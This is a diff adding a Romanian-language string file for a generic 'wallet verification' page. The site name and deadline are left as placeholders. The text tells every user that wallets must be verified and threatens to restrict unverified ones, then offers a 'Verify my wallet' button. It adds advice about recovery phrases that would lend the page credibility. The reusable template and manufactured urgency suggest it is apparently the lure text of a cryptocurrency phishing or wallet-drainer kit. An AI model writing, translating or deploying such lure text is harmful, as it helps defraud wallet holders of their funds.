@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Verificarea Portofelului | {websiteName}",
+    "mainTitle": "Verificarea Portofelului Necesară",
+    "description1": "Pentru a menține standardele de securitate și conformitatea reglementară, acum solicităm verificarea adresei portofelului pentru toți utilizatorii.",
+    "deadlineText": "Începând cu {date}, orice portofel neverificat va fi",
+    "restrictionText": " temporar restricționat",
+    "cooperationText": "Apreciem cooperarea dvs. în menținerea platformei noastre în siguranță.",
+    "termsText": "Sunt de acord cu",
+    "termsLink": "Termenii de utilizare {websiteName}",
+    "verifyBtnText": "Verifică-mi Portofelul",
+    "securityBtnText": "Despre Frazele Compromise",
+    "modalTitle": "Alertă de Securitate: Fraze de Recuperare Compromise",
+    "modalWarning": "Avertisment Critic:",
+    "modalWarningText": "Fraza de recuperare este cheia principală a portofelului dvs. Nu o dezvăluiți niciodată nimănui și nu o introduceți pe niciun site web.",
+    "signsTitle": "Semnele unei fraze compromise:",
+    "signsList": [
+        "Împărtășită cu cineva care pretinde că este suport",
+        "Stocată digital (fotografii, cloud, mesaje)",
+        "Tranzacții neautorizate în portofelul dvs."
+    ],
+    "actionTitle": "Acțiune imediată necesară dacă este compromis:",
+    "actionList": [
+        "Transferați imediat toate fondurile într-un portofel nou și sigur",
+        "Generați o frază de recuperare complet nouă",
+        "Nu folosiți niciodată nicio versiune a vechii fraze"
+    ],
+    "modalNote": "Notă: {websiteName} nu vă va cere niciodată fraza de recuperare. Acest proces de verificare necesită doar adresa publică a portofelului."
+} 
+
+
+
